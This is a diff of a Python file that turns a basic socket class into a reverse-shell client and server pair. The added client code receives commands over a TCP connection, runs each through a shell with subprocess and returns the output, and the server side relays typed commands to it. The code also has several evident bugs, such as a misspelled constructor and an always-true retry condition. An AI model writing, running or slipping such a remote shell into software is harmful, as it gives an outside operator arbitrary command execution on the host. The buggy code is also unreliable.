@@ -1,33 +1,106 @@
-from socket import socket
+import socket
+import os
+import subprocess
 
 
 class Machine:
-    DEFAULT_PORT = 56842
+    def __int__(self):
+        #create socket
+        try:
+            self.s = socket.socket()
+        except socket.error as msg:
+            print("Socket creation error: " + str(msg))
 
-    # initialize connection
-    def __init__(self, address: str, port: int):
-        self.address = address
-        self.port = port
-        self.socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-        self.socket.bind((address, port))
-
-    def stop(self):
-        self.socket.close()
-        print("End of connection")
+    def quit(self):
+        self.s.close()
 
 
+#client is "us"
 class Client(Machine):
-    def __init__(self, address, port):
-        super().__init__(address, port)
-        self.socket.connect("",port);
-        print("connection")
+    def __init__(self, host="127.0.0.1", port=9999):
+        self.host = host
+        self.port = port
+
+    def connect_to_server(self):
+        self.s.connect((self.host, self.port))
+
+    def reverse_shell_client(self):
+        while True:
+            data = self.s.recv(1024)
+            if data.decode("utf-8") == "quit":
+                print("Client program Shutdown")
+                self.s.send(str.encode("Client Program Shutdown"))
+                break
+            else:
+                try:
+                    if data[:2].decode("utf-8") == 'cd':
+                        os.chdir(data[3:].decode("utf-8"))
+                    if len(data) > 0:
+                        cmd = subprocess.Popen(data[:].decode("utf-8"), shell=True, stdout=subprocess.PIPE,
+                                               stderr=subprocess.PIPE, stdin=subprocess.PIPE)
+                        print(cmd)
+                        output_bytes = cmd.stdout.read() + cmd.stderr.read()
+                        output_str = output_bytes.decode("utf-8", errors='replace')
+                        self.s.send(str.encode(output_str + str(os.getcwd()) + "> "))
+                        print(output_str)
+                except OSError as msg:
+                    error_msg = "Error OS : " + str(msg)
+                    print(error_msg)
+                    self.send(str.encode(error_msg))
+
+    def quit(self):
+        pass
 
 
+#Target is the server
 class Target(Machine):
-    def __init__(self, address, port):
-        super().__init__(address, port)
-        self.socket.listen(1)
-        print("listening...")
-        self.socket, infoCo = socket.accept()
-        print("Co ok")
+
+    #initialize host and port server
+    def __init__(self, host="", port=9999):
+        self.host = host
+        self.port = port
+
+    #bind de socket with the port
+    def socket_bind(self):
+        print("Bidding socket to port " + str(self.port))
+        try:
+            self.s.bind((self.host, self.port))
+        except socket.error as msg:
+            print("Socket binding error: " + str(msg) + "\n" + "Do you want to retry ?")
+            if input() == "y" or "yes":
+                self.socket_bind(self)
+
+    #accept the new co
+    def socket_accept(self):
+        global conn
+        conn, address = self.s.accept()
+        print("Connexion has been establish | " + "IP " + address[0] + " | Port : " + str(address[1]))
+
+    def reverse_shell(self):
+        cmd = input()
+        if cmd == "quit":
+            conn.send(str.encode(cmd))
+            client_response = str(conn.recv(1024), "utf-8")
+            print(client_response)
+
+            self.quit(self)
+        if len(str.encode(cmd)) > 0:
+            conn.send(str.encode(cmd))
+            client_response = str(conn.recv(1024), "utf-8")
+            print(client_response, end="")
+
+    def print_on_both(self, msg):
+        conn.send(str.encode(msg))
+        print(msg)
+
+    #close de connection and the socket
+    def quit(self):
+        try:
+            conn.close()
+            self.print_on_both("connection close")
+            super().quit()
+            self.print_on_both("socket close")
+        except socket.error as msg:
+            print("the socket fail to close : " + str(msg))
+
 
